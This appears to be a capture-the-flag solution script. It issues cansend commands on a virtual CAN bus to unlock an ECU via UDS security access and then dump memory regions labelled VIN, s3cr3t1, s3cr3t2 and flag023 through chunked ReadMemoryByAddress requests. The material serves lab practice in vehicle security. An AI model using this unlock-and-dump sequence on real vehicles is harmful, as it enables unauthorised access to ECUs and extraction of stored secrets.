# Post-authentication 0x23 commands (single-frame, ALFID 0x12)
# Interface: vcan0
# Unlock first (example):
# cansend vcan0 7E0#021004
# cansend vcan0 7E0#022703
# cansend vcan0 7E0#022703
# cansend vcan0 7E0#042704<KEY>

# --- VIN (17 bytes) ---
# VIN_PADDED start=0x553F len=145 -> VIN @ 0x557F
cansend vcan0 7E0#052312557F06
cansend vcan0 7E0#052312558506
cansend vcan0 7E0#052312558B05

# --- s3cr3t1 ---
# start=0xF512 len=323 bytes
# first 6 bytes:
cansend vcan0 7E0#052312F51206
# full dump (6B chunks):
cansend vcan0 7E0#052312F51206
cansend vcan0 7E0#052312F51806
cansend vcan0 7E0#052312F51E06
cansend vcan0 7E0#052312F52406
cansend vcan0 7E0#052312F52A06
cansend vcan0 7E0#052312F53006
cansend vcan0 7E0#052312F53606
cansend vcan0 7E0#052312F53C06
cansend vcan0 7E0#052312F54206
cansend vcan0 7E0#052312F54806
cansend vcan0 7E0#052312F54E06
cansend vcan0 7E0#052312F55406
cansend vcan0 7E0#052312F55A06
cansend vcan0 7E0#052312F56006
cansend vcan0 7E0#052312F56606
cansend vcan0 7E0#052312F56C06
cansend vcan0 7E0#052312F57206
cansend vcan0 7E0#052312F57806
cansend vcan0 7E0#052312F57E06
cansend vcan0 7E0#052312F58406
cansend vcan0 7E0#052312F58A06
cansend vcan0 7E0#052312F59006
cansend vcan0 7E0#052312F59606
cansend vcan0 7E0#052312F59C06
cansend vcan0 7E0#052312F5A206
cansend vcan0 7E0#052312F5A806
cansend vcan0 7E0#052312F5AE06
cansend vcan0 7E0#052312F5B406
cansend vcan0 7E0#052312F5BA06
cansend vcan0 7E0#052312F5C006
cansend vcan0 7E0#052312F5C606
cansend vcan0 7E0#052312F5CC06
cansend vcan0 7E0#052312F5D206
cansend vcan0 7E0#052312F5D806
cansend vcan0 7E0#052312F5DE06
cansend vcan0 7E0#052312F5E406
cansend vcan0 7E0#052312F5EA06
cansend vcan0 7E0#052312F5F006
cansend vcan0 7E0#052312F5F606
cansend vcan0 7E0#052312F5FC06
cansend vcan0 7E0#052312F60206
cansend vcan0 7E0#052312F60806
cansend vcan0 7E0#052312F60E06
cansend vcan0 7E0#052312F61406
cansend vcan0 7E0#052312F61A06
cansend vcan0 7E0#052312F62006
cansend vcan0 7E0#052312F62606
cansend vcan0 7E0#052312F62C06
cansend vcan0 7E0#052312F63206
cansend vcan0 7E0#052312F63806
cansend vcan0 7E0#052312F63E06
cansend vcan0 7E0#052312F64406
cansend vcan0 7E0#052312F64A06
cansend vcan0 7E0#052312F65005

# --- s3cr3t2 ---
# start=0xA871 len=282 bytes
# first 6 bytes:
cansend vcan0 7E0#052312A87106
# full dump (6B chunks):
cansend vcan0 7E0#052312A87106
cansend vcan0 7E0#052312A87706
cansend vcan0 7E0#052312A87D06
cansend vcan0 7E0#052312A88306
cansend vcan0 7E0#052312A88906
cansend vcan0 7E0#052312A88F06
cansend vcan0 7E0#052312A89506
cansend vcan0 7E0#052312A89B06
cansend vcan0 7E0#052312A8A106
cansend vcan0 7E0#052312A8A706
cansend vcan0 7E0#052312A8AD06
cansend vcan0 7E0#052312A8B306
cansend vcan0 7E0#052312A8B906
cansend vcan0 7E0#052312A8BF06
cansend vcan0 7E0#052312A8C506
cansend vcan0 7E0#052312A8CB06
cansend vcan0 7E0#052312A8D106
cansend vcan0 7E0#052312A8D706
cansend vcan0 7E0#052312A8DD06
cansend vcan0 7E0#052312A8E306
cansend vcan0 7E0#052312A8E906
cansend vcan0 7E0#052312A8EF06
cansend vcan0 7E0#052312A8F506
cansend vcan0 7E0#052312A8FB06
cansend vcan0 7E0#052312A90106
cansend vcan0 7E0#052312A90706
cansend vcan0 7E0#052312A90D06
cansend vcan0 7E0#052312A91306
cansend vcan0 7E0#052312A91906
cansend vcan0 7E0#052312A91F06
cansend vcan0 7E0#052312A92506
cansend vcan0 7E0#052312A92B06
cansend vcan0 7E0#052312A93106
cansend vcan0 7E0#052312A93706
cansend vcan0 7E0#052312A93D06
cansend vcan0 7E0#052312A94306
cansend vcan0 7E0#052312A94906
cansend vcan0 7E0#052312A94F06
cansend vcan0 7E0#052312A95506
cansend vcan0 7E0#052312A95B06
cansend vcan0 7E0#052312A96106
cansend vcan0 7E0#052312A96706
cansend vcan0 7E0#052312A96D06
cansend vcan0 7E0#052312A97306
cansend vcan0 7E0#052312A97906
cansend vcan0 7E0#052312A97F06
cansend vcan0 7E0#052312A98506

# --- flag023 ---
# start=0x568B len=153 bytes
# full dump (6B chunks):
cansend vcan0 7E0#052312568B06
cansend vcan0 7E0#052312569106
cansend vcan0 7E0#052312569706
cansend vcan0 7E0#052312569D06
cansend vcan0 7E0#05231256A306
